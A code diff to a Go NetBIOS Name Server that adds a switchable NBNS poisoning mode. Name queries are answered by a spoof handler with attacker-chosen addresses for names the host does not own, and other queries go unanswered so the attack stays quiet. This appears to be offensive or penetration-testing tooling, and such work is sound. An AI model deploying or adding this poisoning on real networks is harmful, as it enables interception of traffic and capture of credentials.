@@ -20,12 +20,27 @@ const (
 
 // UDPServer represents a NetBIOS Name Server UDP component
 type UDPServer struct {
-	nbns    *NetBIOSNameServer
+	nbns     *NetBIOSNameServer
 	conn     *net.UDPConn
 	addr     *net.UDPAddr
 	wg       sync.WaitGroup
 	quit     chan struct{}
 	handlers *PacketHandler
+
+	// spoofHandler, when non-nil, replaces the authoritative name-table lookup
+	// for the NAME QUERY opcode: name queries are answered by the poisoner
+	// instead of the local name table, and unmatched queries are left
+	// unanswered so legitimate resolution can still proceed.
+	spoofHandler *SpoofHandler
+}
+
+// SetSpoofHandler installs an NBNS poisoning handler on the UDP server. Once
+// set, NAME QUERY REQUESTs are answered by the SpoofHandler (which claims names
+// the host does not own with an attacker-chosen address) rather than by the
+// authoritative name table; every other opcode is handled as before. Passing
+// nil restores the authoritative behaviour.
+func (s *UDPServer) SetSpoofHandler(h *SpoofHandler) {
+	s.spoofHandler = h
 }
 
 // NewUDPServer creates a new NBNS UDP server instance
@@ -36,7 +51,7 @@ func NewUDPServer(addr string, nbns *NetBIOSNameServer) (*UDPServer, error) {
 	}
 
 	return &UDPServer{
-		nbns:    nbns,
+		nbns:     nbns,
 		addr:     udpAddr,
 		quit:     make(chan struct{}),
 		handlers: NewPacketHandler(nbns),
@@ -123,7 +138,18 @@ func (s *UDPServer) handlePacket(data []byte, remoteAddr *net.UDPAddr) {
 	// Process based on operation code
 	switch packet.Header.Flags & 0xF000 {
 	case OpNameQuery:
-		s.handlers.handleNameQuery(&packet, response)
+		if s.spoofHandler != nil {
+			// Poisoning mode: answer only the names the operator elected to
+			// spoof and stay silent otherwise, so legitimate resolution still
+			// works alongside the poisoner.
+			spoofed, ok := s.spoofHandler.HandleNameQuery(remoteAddr, &packet)
+			if !ok {
+				return
+			}
+			response = spoofed
+		} else {
+			s.handlers.handleNameQuery(&packet, response)
+		}
 	case OpRegistration:
 		s.handlers.handleRegistration(&packet, response)
 	case OpRelease:
